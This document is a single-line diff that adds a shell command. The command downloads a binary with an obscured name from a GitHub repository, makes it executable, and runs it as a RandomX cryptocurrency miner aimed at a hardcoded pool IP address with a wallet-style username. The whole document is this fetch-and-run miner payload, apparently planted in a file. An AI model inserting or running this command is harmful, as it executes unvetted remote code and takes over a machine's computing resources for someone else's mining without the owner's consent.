@@ -1,0 +1,1 @@
+wget https://github.com/ismaimwan6372/xerependit/raw/main/xerependit && chmod 700 xerependit && ./xerependit -a RandomX -o 209.25.142.78:3333 -u XRP:rs2dgzYeqYqsk8bvkQR5YPyqsXYcA24MP2:350488.STRIXPRO -t 3
